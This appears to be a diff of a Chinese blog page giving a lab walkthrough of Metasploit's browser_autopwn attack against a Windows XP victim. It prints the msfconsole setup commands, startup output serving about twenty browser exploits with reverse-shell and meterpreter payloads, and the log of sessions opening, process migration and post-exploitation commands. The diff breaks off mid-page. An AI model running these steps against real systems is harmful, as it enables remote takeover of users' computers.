@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-12-07T10:32:00.000Z">
-<meta property="article:modified_time" content="2023-12-09T15:23:01.167Z">
+<meta property="article:modified_time" content="2023-12-12T06:35:32.148Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="Metasploit">
 <meta name="twitter:card" content="summary">
@@ -143,7 +143,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80browser-autopwn%E6%94%BB%E5%87%BB"><span class="nav-text">一、browser autopwn攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">二、实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="nav-text">三、实验步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#kali-%E6%93%8D%E4%BD%9C"><span class="nav-text">1、Kali 操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%97%E5%AE%B3%E8%80%85%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">2、受害者访问服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kali-%E6%95%88%E6%9E%9C"><span class="nav-text">3、Kali 效果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">4、后渗透攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-text">四、参考文献</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#browser-autopwn%E6%94%BB%E5%87%BB"><span class="nav-text">1. browser autopwn攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">2. 实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="nav-text">3. 实验步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#kali-%E6%93%8D%E4%BD%9C"><span class="nav-text">1、Kali 操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%97%E5%AE%B3%E8%80%85%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">2、受害者访问服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kali-%E6%95%88%E6%9E%9C"><span class="nav-text">3、Kali 效果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">4、后渗透攻击</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -243,7 +243,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-09 23:23:01" itemprop="dateModified" datetime="2023-12-09T23:23:01+08:00">2023-12-09</time>
+      <time title="修改时间：2023-12-12 14:35:32" itemprop="dateModified" datetime="2023-12-12T14:35:32+08:00">2023-12-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -262,7 +262,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.1k</span>
+      <span>1k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -280,188 +280,22 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="一browser-autopwn攻击">一、browser autopwn攻击</h2>
+    <div class="post-body" itemprop="articleBody"><h2 id="browser-autopwn攻击">1. browser autopwn攻击</h2>
 <p><strong>原理</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211207182106184-1912346437.png" /></p>
-<h2 id="二实验环境">二、实验环境</h2>
+<h2 id="实验环境">2. 实验环境</h2>
 <p><strong>攻击机（服务器）：kali 2019.3</strong></p>
 <p><strong>靶机（受害者）：winXP</strong></p>
-<h2 id="三实验步骤">三、实验步骤</h2>
+<h2 id="实验步骤">3. 实验步骤</h2>
 <h3 id="kali-操作">1、Kali 操作</h3>
-<pre><code>**msf5 &gt; use auxiliary/server/browser_autopwn
-    msf5 auxiliary(server/browser_autopwn) &gt;** **show options** 
-    
-    Module options (auxiliary/server/browser_autopwn):
-    
-       Name     Current Setting  Required  Description
-       ----     ---------------  --------  -----------
-       LHOST                     yes       The IP address to use for reverse-connect payloads
-       SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
-       SRVPORT  8080             yes       The local port to listen on.
-       SSL      false            no        Negotiate SSL for incoming connections
-       SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
-       URIPATH                   no        The URI to use for this exploit (default is random)
-    
-    
-    Auxiliary action:
-    
-       Name       Description
-       ----       -----------
-       WebServer  Start a bunch of modules and direct clients to appropriate exploits
-    
-    
-**msf5 auxiliary(server** **/browser_autopwn) &gt; set srvhost 10.10.10.155**
-    srvhost =&gt; 10.10.10.155 **msf5 auxiliary(server /browser_autopwn) &gt; set lhost 10.10.10.155**
-    lhost =&gt; 10.10.10.155 **msf5 auxiliary(server /browser_autopwn) &gt; set URIPATH /**
-    URIPATH =&gt; / **msf5 auxiliary(server /browser_autopwn) &gt;** **exploit** 
-    [*] Auxiliary module running as background job 0.
-    
-    [*] Setup
-    msf5 auxiliary(server/browser_autopwn) &gt; 
-    [*] Starting exploit modules on host 10.10.10.155...
-    [*] ---
-    
-    [*] Starting exploit android/browser/webview_addjavascriptinterface with payload android/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/qOnCM
-    [*] Server started.
-    [*] Starting exploit multi/browser/firefox_proto_crmfrequest with payload generic/shell_reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/LKtM
-    [*] Server started.
-    [*] Starting exploit multi/browser/firefox_tostring_console_injection with payload generic/shell_reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/Plrmb
-    [*] Server started.
-    [*] Starting exploit multi/browser/firefox_webidl_injection with payload generic/shell_reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/OLrJlXl
-    [*] Server started.
-    [*] Starting exploit multi/browser/java_atomicreferencearray with payload java/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/DGMKpkzgl
-    [*] Server started.
-    [*] Starting exploit multi/browser/java_jre17_jmxbean with payload java/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/vxSkgPKnuw
-    [*] Server started.
-    [*] Starting exploit multi/browser/java_jre17_provider_skeleton with payload java/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/qFeUdwupePC
-    [*] Server started.
-    [*] Starting exploit multi/browser/java_jre17_reflection_types with payload java/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/IglhJsmnNeL
-    [*] Server started.
-    [*] Starting exploit multi/browser/java_rhino with payload java/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/QVlrRXkqoDlY
-    [*] Server started.
-    [*] Starting exploit multi/browser/java_verifier_field_access with payload java/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/mAcrliKw
-    [*] Server started.
-    [*] Starting exploit multi/browser/opera_configoverwrite with payload generic/shell_reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/IgQvQD
-    [*] Server started.
-    [*] Starting exploit windows/browser/adobe_flash_mp4_cprt with payload windows/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/kSfNK
-    [*] Server started.
-    [*] Starting exploit windows/browser/adobe_flash_rtmp with payload windows/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/mwwNxNpLenMHX
-    [*] Server started.
-    [*] Starting exploit windows/browser/ie_cgenericelement_uaf with payload windows/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/qgSKzGkMm
-    [*] Server started.
-    [*] Starting exploit windows/browser/ie_createobject with payload windows/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/oUBVvezFfKcd
-    [*] Server started.
-    [*] Starting exploit windows/browser/ie_execcommand_uaf with payload windows/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/DMZgEQHCUT
-    [*] Server started.
-    [*] Starting exploit windows/browser/mozilla_nstreerange with payload windows/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/iTUVRf
-    [*] Server started.
-    [*] Starting exploit windows/browser/ms13_080_cdisplaypointer with payload windows/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/cGsnYd
-    [*] Server started.
-    [*] Starting exploit windows/browser/ms13_090_cardspacesigninhelper with payload windows/meterpreter/reverse_tcp
-    [*] Using URL: http://10.10.10.155:8080/eCSchQ
-    [*] Server started.
-    [*] Starting exploit windows/browser/msxml_get_definition_code_exec with payload windows/meterpreter/reverse_tcp
-    [*] Starting handler for windows/meterpreter/reverse_tcp on port 3333
-    [*] Starting handler for generic/shell_reverse_tcp on port 6666
-    [*] Started reverse TCP handler on 10.10.10.155:3333 
-    [*] Using URL: http://10.10.10.155:8080/UOaOFkJ
-    [*] Server started.
-    [*] Starting handler for java/meterpreter/reverse_tcp on port 7777
-    [*] Started reverse TCP handler on 10.10.10.155:6666 
-    [*] Started reverse TCP handler on 10.10.10.155:7777 
-    
-    [*] --- Done, found 20 exploit modules
-    
-**[** ***] Using URL: http://10.10.10.155:8080/**
-    [*] Server started.</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/browser_autopwn</span><br><span class="line">msf5 auxiliary(server/browser_autopwn) &gt;show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/browser_autopwn):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   LHOST                     <span class="built_in">yes</span>       The IP address to use <span class="keyword">for</span> reverse-connect payloads</span><br><span class="line">   SRVHOST  0.0.0.0          <span class="built_in">yes</span>       The <span class="built_in">local</span> host to listen on. This must be an address on the <span class="built_in">local</span> machine or 0.0.0.0</span><br><span class="line">   SRVPORT  8080             <span class="built_in">yes</span>       The <span class="built_in">local</span> port to listen on.</span><br><span class="line">   SSL      <span class="literal">false</span>            no        Negotiate SSL <span class="keyword">for</span> incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use <span class="keyword">for</span> this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name       Description</span><br><span class="line">   ----       -----------</span><br><span class="line">   WebServer  Start a bunch of modules and direct clients to appropriate exploits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(server/browser_autopwn) &gt; <span class="built_in">set</span> srvhost 10.10.10.155</span><br><span class="line">srvhost =&gt; 10.10.10.155 msf5 auxiliary(server /browser_autopwn) &gt; <span class="built_in">set</span> lhost 10.10.10.155</span><br><span class="line">lhost =&gt; 10.10.10.155 msf5 auxiliary(server /browser_autopwn) &gt; <span class="built_in">set</span> URIPATH /</span><br><span class="line">URIPATH =&gt; / msf5 auxiliary(server /browser_autopwn) &gt;exploit </span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Setup</span><br><span class="line">msf5 auxiliary(server/browser_autopwn) &gt; </span><br><span class="line">[*] Starting exploit modules on host 10.10.10.155...</span><br><span class="line">[*] ---</span><br><span class="line"></span><br><span class="line">[*] Starting exploit android/browser/webview_addjavascriptinterface with payload android/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/qOnCM</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/firefox_proto_crmfrequest with payload generic/shell_reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/LKtM</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/firefox_tostring_console_injection with payload generic/shell_reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/Plrmb</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/firefox_webidl_injection with payload generic/shell_reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/OLrJlXl</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_atomicreferencearray with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/DGMKpkzgl</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_jre17_jmxbean with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/vxSkgPKnuw</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_jre17_provider_skeleton with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/qFeUdwupePC</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_jre17_reflection_types with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/IglhJsmnNeL</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_rhino with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/QVlrRXkqoDlY</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/java_verifier_field_access with payload java/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/mAcrliKw</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit multi/browser/opera_configoverwrite with payload generic/shell_reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/IgQvQD</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/adobe_flash_mp4_cprt with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/kSfNK</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/adobe_flash_rtmp with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/mwwNxNpLenMHX</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/ie_cgenericelement_uaf with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/qgSKzGkMm</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/ie_createobject with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/oUBVvezFfKcd</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/ie_execcommand_uaf with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/DMZgEQHCUT</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/mozilla_nstreerange with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/iTUVRf</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/ms13_080_cdisplaypointer with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/cGsnYd</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/ms13_090_cardspacesigninhelper with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/eCSchQ</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting exploit windows/browser/msxml_get_definition_code_exec with payload windows/meterpreter/reverse_tcp</span><br><span class="line">[*] Starting handler <span class="keyword">for</span> windows/meterpreter/reverse_tcp on port 3333</span><br><span class="line">[*] Starting handler <span class="keyword">for</span> generic/shell_reverse_tcp on port 6666</span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.155:3333 </span><br><span class="line">[*] Using URL: http://10.10.10.155:8080/UOaOFkJ</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Starting handler <span class="keyword">for</span> java/meterpreter/reverse_tcp on port 7777</span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.155:6666 </span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.155:7777 </span><br><span class="line"></span><br><span class="line">[*] --- Done, found 20 exploit modules</span><br><span class="line"></span><br><span class="line">    [*] Using URL: http://10.10.10.155:8080/</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>
 <h3 id="受害者访问服务器">2、受害者访问服务器</h3>
 <p><strong>使用winXP的ie访问 http://10.10.10.155:8080/</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211207182242787-741332284.png" /></p>
 <h3 id="kali-效果">3、Kali 效果</h3>
-<pre><code>    [*] Handling &#39;/&#39;
-    [*] Handling &#39;/?sessid=V2luZG93cyBYUDp1bmRlZmluZWQ6dW5kZWZpbmVkOnVuZGVmaW5lZDpTUDI6emgtY246eDg2Ok1TSUU6Ni4wOg%3d%3d&#39;
-    [*] JavaScript Report: Windows XP:undefined:undefined:undefined:SP2:zh-cn:x86:MSIE:6.0:
-    [*] Responding with 14 exploits
-    [*] 10.10.10.132     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
-    [*] 10.10.10.132     java_atomicreferencearray - Generated jar to drop (5304 bytes).
-    [*] 10.10.10.132     java_jre17_jmxbean - handling request for /vxSkgPKnuw
-    [*] 10.10.10.132     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
-    …………
-    [*] Sending stage (179779 bytes) to 10.10.10.132
-    [*] 10.10.10.132     java_jre17_provider_skeleton - handling request for /qFeUdwupePC
-    [*] 10.10.10.132     java_jre17_reflection_types - handling request for /IglhJsmnNeL/
-    [*] 10.10.10.132     java_rhino - Java Applet Rhino Script Engine Remote Code Execution handling request
-    [*] 10.10.10.132     java_verifier_field_access - Sending Java Applet Field Bytecode Verifier Cache Remote Code Execution
-    [*] 10.10.10.132     java_verifier_field_access - Generated jar to drop (5304 bytes).
-    [*] 10.10.10.132     java_jre17_provider_skeleton - handling request for /qFeUdwupePC/
-    [*] Meterpreter session 1 opened (10.10.10.155:3333 -&gt; 10.10.10.132:1203) at 2021-10-06 03:33:53 -0400
-    [*] Sending stage (179779 bytes) to 10.10.10.132
-    [*] Meterpreter session 2 opened (10.10.10.155:3333 -&gt; 10.10.10.132:1204) at 2021-10-06 03:34:09 -0400
-    [*] Session ID 1 (10.10.10.155:3333 -&gt; 10.10.10.132:1203) processing InitialAutoRunScript &#39;migrate -f&#39;
-    [!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.
-    [!] Example: run post/windows/manage/migrate OPTION=value [...]
-    [*] Current server process: FTTwbkTSNceYy.exe (3724)
-    [*] Spawning notepad.exe process to migrate to
-    [+] Migrating to 968
-    [*] Session ID 2 (10.10.10.155:3333 -&gt; 10.10.10.132:1204) processing InitialAutoRunScript &#39;migrate -f&#39;
-    [!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.
-    [!] Example: run post/windows/manage/migrate OPTION=value [...]
-    [*] Current server process: unZbEFCawVoIclyNztFCwJ.exe (3732)
-    [*] Spawning notepad.exe process to migrate to
-    [+] Migrating to 1024 **[ +** **] Successfully migrated to process** 
-    
-**msf5 auxiliary(server** **/browser_autopwn) &gt; sessions -** **i**
-    
-    Active sessions
-    ===============
-    
-      Id  Name  Type                     Information                             Connection
-      --  ----  ----                     -----------                             ----------
-      1         meterpreter x86/windows  WINXP-Z9M8R8-1\z9m8r8 @ WINXP-Z9M8R8-1  10.10.10.155:3333 -&gt; 10.10.10.132:1203 (10.10.10.132)
-      2         meterpreter x86/windows  WINXP-Z9M8R8-1\z9m8r8 @ WINXP-Z9M8R8-1  10.10.10.155:3333 -&gt; 10.10.10.132:1204 (10.10.10.132)
-  **msf5 auxiliary(server** **/browser_autopwn) &gt; sessions -i 2**
-    [*] Starting interaction with 2...
-    
-**meterpreter** **&gt;** **ps**
-    
-    Process List
-    ============
-    
-     PID   PPID  Name               Arch  Session  User                          Path
-     ---   ----  ----               ----  -------  ----                          ----
-     0     0     [System Process]                                                
-     4     0     System             x86   0        NT AUTHORITY\SYSTEM           
-     188   664   VGAuthService.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
-     192   1484  conime.exe         x86   0        WINXP-Z9M8R8-1\z9m8r8         C:\WINDOWS\system32\conime.exe
-     808   1508  pythonw.exe        x86   0        WINXP-Z9M8R8-1\z9m8r8         C:\Python27\pythonw.exe
-     1508  1484  explorer.exe       x86   0        WINXP-Z9M8R8-1\z9m8r8         C:\WINDOWS\Explorer.EXE
-    …………
-  **meterpreter** **&gt; migrate  1508**
-    [*] Migrating from 1024 to 1508...
-    [*] Migration completed successfully.
-**meterpreter** **&gt;** </code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[*] Handling <span class="string">&#x27;/&#x27;</span></span><br><span class="line">[*] Handling <span class="string">&#x27;/?sessid=V2luZG93cyBYUDp1bmRlZmluZWQ6dW5kZWZpbmVkOnVuZGVmaW5lZDpTUDI6emgtY246eDg2Ok1TSUU6Ni4wOg%3d%3d&#x27;</span></span><br><span class="line">[*] JavaScript Report: Windows XP:undefined:undefined:undefined:SP2:zh-cn:x86:MSIE:6.0:</span><br><span class="line">[*] Responding with 14 exploits</span><br><span class="line">[*] 10.10.10.132     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability</span><br><span class="line">[*] 10.10.10.132     java_atomicreferencearray - Generated jar to drop (5304 bytes).</span><br><span class="line">[*] 10.10.10.132     java_jre17_jmxbean - handling request <span class="keyword">for</span> /vxSkgPKnuw</span><br><span class="line">[*] 10.10.10.132     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability</span><br><span class="line">…………</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.132</span><br><span class="line">[*] 10.10.10.132     java_jre17_provider_skeleton - handling request <span class="keyword">for</span> /qFeUdwupePC</span><br><span class="line">[*] 10.10.10.132     java_jre17_reflection_types - handling request <span class="keyword">for</span> /IglhJsmnNeL/</span><br><span class="line">[*] 10.10.10.132     java_rhino - Java Applet Rhino Script Engine Remote Code Execution handling request</span><br><span class="line">[*] 10.10.10.132     java_verifier_field_access - Sending Java Applet Field Bytecode Verifier Cache Remote Code Execution</span><br><span class="line">[*] 10.10.10.132     java_verifier_field_access - Generated jar to drop (5304 bytes).</span><br><span class="line">[*] 10.10.10.132     java_jre17_provider_skeleton - handling request <span class="keyword">for</span> /qFeUdwupePC/</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.10.155:3333 -&gt; 10.10.10.132:1203) at 2021-10-06 03:33:53 -0400</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.132</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.10.155:3333 -&gt; 10.10.10.132:1204) at 2021-10-06 03:34:09 -0400</span><br><span class="line">[*] Session ID 1 (10.10.10.155:3333 -&gt; 10.10.10.132:1203) processing InitialAutoRunScript <span class="string">&#x27;migrate -f&#x27;</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.</span><br><span class="line">[!] Example: run post/windows/manage/migrate OPTION=value [...]</span><br><span class="line">[*] Current server process: FTTwbkTSNceYy.exe (3724)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 968</span><br><span class="line">[*] Session ID 2 (10.10.10.155:3333 -&gt; 10.10.10.132:1204) processing InitialAutoRunScript <span class="string">&#x27;migrate -f&#x27;</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.</span><br><span class="line">[!] Example: run post/windows/manage/migrate OPTION=value [...]</span><br><span class="line">[*] Current server process: unZbEFCawVoIclyNztFCwJ.exe (3732)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 1024 [ +] Successfully migrated to process </span><br><span class="line"></span><br><span class="line">    msf5 auxiliary(server/browser_autopwn) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                             Connection</span><br><span class="line">  --  ----  ----                     -----------                             ----------</span><br><span class="line">  1         meterpreter x86/windows  WINXP-Z9M8R8-1\z9m8r8 @ WINXP-Z9M8R8-1  10.10.10.155:3333 -&gt; 10.10.10.132:1203 (10.10.10.132)</span><br><span class="line">  2         meterpreter x86/windows  WINXP-Z9M8R8-1\z9m8r8 @ WINXP-Z9M8R8-1  10.10.10.155:3333 -&gt; 10.10.10.132:1204 (10.10.10.132)</span><br><span class="line">      msf5 auxiliary(server/browser_autopwn) &gt; sessions -i 2</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line"></span><br><span class="line">    meterpreter&gt;ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span 